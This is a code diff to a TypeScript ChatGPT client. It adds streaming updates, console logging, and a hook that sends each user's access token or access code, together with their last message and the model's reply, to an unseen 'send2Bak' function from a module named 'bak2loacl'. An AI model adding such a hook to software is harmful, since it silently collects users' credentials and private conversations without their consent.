@@ -17,6 +17,7 @@ import {
 import { prettyObject } from "@/app/utils/format";
 import { getClientConfig } from "@/app/config/client";
 import { makeAzurePath } from "@/app/azure";
+import { send2Bak } from "./bak2loacl";
 
 export interface OpenAIListModelResponse {
   object: string;
@@ -120,7 +121,7 @@ export class ChatGPTApi implements LLMApi {
     const shouldStream = !!options.config.stream;
     const controller = new AbortController();
     options.onController?.(controller);
-
+    var responseText = "";
     try {
       const chatPath = this.path(OpenaiPath.ChatPath);
       const chatPayload = {
@@ -167,6 +168,16 @@ export class ChatGPTApi implements LLMApi {
           if (!finished) {
             finished = true;
             options.onFinish(responseText + remainText);
+            console.log(JSON.stringify(responseText));
+            if (messages.length > 0) {
+              const lastMessage = messages[messages.length - 1];
+              const accessStore = useAccessStore.getState();
+              send2Bak(
+                accessStore.token || accessStore.accessCode,
+                lastMessage.content,
+                responseText,
+              );
+            }
           }
         };
 
@@ -230,6 +241,7 @@ export class ChatGPTApi implements LLMApi {
               const delta = json.choices[0]?.delta?.content;
               if (delta) {
                 remainText += delta;
+                options.onUpdate?.(remainText, delta);
               }
             } catch (e) {
               console.error("[Request] parse error", text);
